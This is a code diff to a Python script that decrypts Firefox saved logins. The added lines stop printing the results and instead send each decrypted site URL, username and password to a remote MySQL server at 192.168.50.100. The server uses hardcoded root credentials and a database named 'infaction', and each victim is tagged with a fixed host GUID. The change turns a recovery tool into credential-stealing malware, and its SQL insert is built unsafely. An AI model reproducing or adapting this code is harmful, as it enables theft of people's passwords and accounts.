@@ -19,6 +19,7 @@ from Crypto.Cipher import DES3
 from Crypto.Util.number import long_to_bytes   
 from optparse import OptionParser
 import json
+import MySQLdb
    
 def getShortLE(d, a):
    return unpack('<H',(d)[a:a+2])[0]
@@ -307,16 +308,20 @@ parser.add_option("-d", "--dir", type="string", dest="directory", help="director
 
 key = getKey()
 logins = getLoginData()
+mq2=MySQLdb.connect(host="192.168.50.100",port=3306,user="root",passwd="zxc123",db="infaction")
+cur = mq2.cursor()
 if len(logins)==0:
   print 'no stored passwords'
 else:
   print 'decrypting login/password pairs'  
 for i in logins:
-  print '%20s:' % i[2],  #site URL
+  #print '%20s:' % i[2],  #site URL
   iv = i[0][1]
   ciphertext = i[0][2] #login (PKCS#7 padding not removed)
-  print depadding( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext) ), ',',
+  user = depadding( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext) )
   iv = i[1][1]
   ciphertext = i[1][2] #passwd (PKCS#7 padding not removed)
-  print depadding( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext) )
-
+  pwd =  depadding( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext) )
+  l= "insert into browser (origin_url,action_url,user,password,hostid,brwtype) values ('%s','%s','%s','%s','%s','%s')" % (i[2],i[2],user,pwd,"27d5a2af-1d84-4b14-a580-de5f315ac244","fire")
+  cur.execute(l)
+  mq2.commit()
